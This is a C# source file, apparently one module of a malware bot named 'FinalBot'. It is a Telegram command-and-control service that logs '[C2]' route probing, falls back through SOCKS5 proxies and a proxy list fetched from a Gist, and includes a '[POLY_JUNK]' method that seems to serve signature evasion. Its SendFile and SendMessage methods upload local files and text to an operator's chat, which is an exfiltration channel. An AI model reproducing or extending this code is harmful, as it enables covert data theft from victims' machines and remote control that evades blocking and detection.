using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using VanguardCore;

namespace FinalBot
{
    public static class TelegramService
    {
        // [POLY_JUNK]
        private static void _vanguard_31fab2c8() {
            int val = 82600;
            if (val > 50000) Console.WriteLine("Hash:" + 82600);
        }

        private static HttpClient _client = new HttpClient();
        private static string? _botToken;
        private static string? _adminId;
        private static string? _currentProxyUrl;

        public static void Initialize(string token, string adminId, HttpClient? client = null)
        {
            _botToken = token;
            _adminId = adminId;
            if (client != null) _client = client;
            
            // Initializing with default handler if not provided
            if (client == null) RecreateClient(null);
        }

        private static void RecreateClient(string? proxyUrl)
        {
            try
            {
                _currentProxyUrl = proxyUrl;
                var handler = new SocketsHttpHandler
                {
                    ConnectTimeout = TimeSpan.FromSeconds(10),
                    PooledConnectionLifetime = TimeSpan.FromMinutes(5)
                };

                if (!string.IsNullOrEmpty(proxyUrl))
                {
                    // Supporting socks5://user:pass@host:port or socks5://host:port
                    handler.Proxy = new WebProxy(proxyUrl);
                }

                _client = new HttpClient(handler) { Timeout = TimeSpan.FromMinutes(2) };
            }
            catch { _client = new HttpClient(); }
        }

        public static async Task<bool> FindBestRoute()
        {
            Console.WriteLine("[C2] Probing for best connection route...");
            
            // 1. Try Direct
            if (await TestConnection(null)) {
                Console.WriteLine("[C2] Route: DIRECT");
                RecreateClient(null);
                return true;
            }

            // 2. Try L1 (VPS)
            if (!string.IsNullOrEmpty(Constants.L1_PROXY_HOST))
            {
                string l1 = $"socks5://{Constants.L1_PROXY_HOST}:{Constants.L1_PROXY_PORT}";
                if (!string.IsNullOrEmpty(Constants.L1_PROXY_USER))
                    l1 = $"socks5://{Constants.L1_PROXY_USER}:{Constants.L1_PROXY_PASS}@{Constants.L1_PROXY_HOST}:{Constants.L1_PROXY_PORT}";
                
                if (await TestConnection(l1)) {
                    Console.WriteLine("[C2] Route: L1 (VPS)");
                    RecreateClient(l1);
                    return true;
                }
            }

            // 3. Try L2 (Backup)
            if (!string.IsNullOrEmpty(Constants.L2_PROXY_HOST))
            {
                string l2 = $"socks5://{Constants.L2_PROXY_HOST}:{Constants.L2_PROXY_PORT}";
                if (await TestConnection(l2)) {
                    Console.WriteLine("[C2] Route: L2 (Backup)");
                    RecreateClient(l2);
                    return true;
                }
            }

            // 4. Try Mesh Grid (Gist)
            var mesh = await GistManager.GetProxyMeshAsync();
            foreach (var proxy in mesh)
            {
                string pUrl = proxy.StartsWith("socks") ? proxy : $"socks5://{proxy}";
                if (await TestConnection(pUrl)) {
                    Console.WriteLine($"[C2] Route: MESH ({proxy})");
                    RecreateClient(pUrl);
                    return true;
                }
            }

            Console.WriteLine("[!] [C2] No working route found. Offline mode.");
            return false;
        }

        private static async Task<bool> TestConnection(string? proxyUrl)
        {
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                var handler = new SocketsHttpHandler { ConnectTimeout = TimeSpan.FromSeconds(4) };
                if (!string.IsNullOrEmpty(proxyUrl)) handler.Proxy = new WebProxy(proxyUrl);

                using var testClient = new HttpClient(handler);
                // We use a high-stability endpoint for testing (Telegram API Base)
                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl)) baseUrl = "https://api.telegram.org/bot";
                
                // Fast HEAD request to check reachability
                var request = new HttpRequestMessage(HttpMethod.Get, baseUrl + "test") { Version = HttpVersion.Version11 };
                var response = await testClient.SendAsync(request, cts.Token);
                
                // 404 is actually GOOD here because it means we reached the server 
                // but the method/token is invalid (which is expected for /test)
                if (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.NotFound || response.StatusCode == HttpStatusCode.Unauthorized)
                    return true;
            }
            catch { }
            return false;
        }

        private static string EscapeJson(string? s)
        {
            if (string.IsNullOrEmpty(s)) return "\"\"";
            StringBuilder sb = new StringBuilder();
            sb.Append("\"");
            foreach (char c in s)
            {
                switch (c)
                {
                    case '\"': sb.Append("\\\""); break;
                    case '\\': sb.Append("\\\\"); break;
                    case '\b': sb.Append("\\b"); break;
                    case '\f': sb.Append("\\f"); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        int i = (int)c;
                        if (i < 32 || i > 127) sb.AppendFormat("\\u{0:X4}", i);
                        else sb.Append(c);
                        break;
                }
            }
            sb.Append("\"");
            return sb.ToString();
        }

        public static async Task<bool> SendMessage(string text, string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;

            try
            {
                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";
                
                var url = $"{baseUrl}{_botToken}/sendMessage";
                var sb = new StringBuilder();
                sb.Append("{");
                sb.Append($"\"chat_id\":\"{_adminId}\",");
                sb.Append($"\"text\":{EscapeJson(text)},");
                sb.Append("\"parse_mode\":\"Html\"");
                if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
                sb.Append("}");

                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
                var response = await _client.PostAsync(url, content);
                
                if (!response.IsSuccessStatusCode && response.StatusCode >= HttpStatusCode.InternalServerError)
                {
                    // Service failure? Try to rotate route
                    _ = FindBestRoute();
                }

                return response.IsSuccessStatusCode;
            }
            catch 
            { 
                // Connection failed? Try to rotate route
                _ = FindBestRoute();
                return false; 
            }
        }

        public static async Task<bool> SendAnimation(string fileId, string caption = "", string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId)) return false;
            try
            {
                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";

                var url = $"{baseUrl}{_botToken}/sendAnimation";
                var sb = new StringBuilder();
                sb.Append("{");
                sb.Append($"\"chat_id\":\"{_adminId}\",");
                sb.Append($"\"animation\":\"{fileId}\",");
                sb.Append($"\"caption\":{EscapeJson(caption)},");
                sb.Append("\"parse_mode\":\"Html\"");
                if (!string.IsNullOrEmpty(replyMarkupJson)) sb.Append($",\"reply_markup\":{replyMarkupJson}");
                sb.Append("}");

                var content = new StringContent(sb.ToString(), Encoding.UTF8, "application/json");
                var response = await _client.PostAsync(url, content);
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }

        public static async Task<bool> SendFile(string filePath, string caption = "", string? replyMarkupJson = null)
        {
            if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_adminId) || !File.Exists(filePath)) 
                return false;

            try
            {
                var baseUrl = SafetyManager.GetSecret("TG_API_BASE");
                if (string.IsNullOrEmpty(baseUrl) || !baseUrl.Contains("://")) baseUrl = "https://api.telegram.org/bot";

                var url = $"{baseUrl}{_botToken}/sendDocument";
                using var form = new MultipartFormDataContent();
                form.Add(new StringContent(_adminId), "chat_id");
                if (!string.IsNullOrEmpty(caption)) form.Add(new StringContent(caption), "caption");
                if (!string.IsNullOrEmpty(replyMarkupJson)) form.Add(new StringContent(replyMarkupJson), "reply_markup");
                form.Add(new StringContent("Html"), "parse_mode");

                var fileContent = new ByteArrayContent(await File.ReadAllBytesAsync(filePath));
                form.Add(fileContent, "document", Path.GetFileName(filePath));

                var response = await _client.PostAsync(url, form);
                return response.IsSuccessStatusCode;
            }
            catch { return false; }
        }
    }
}
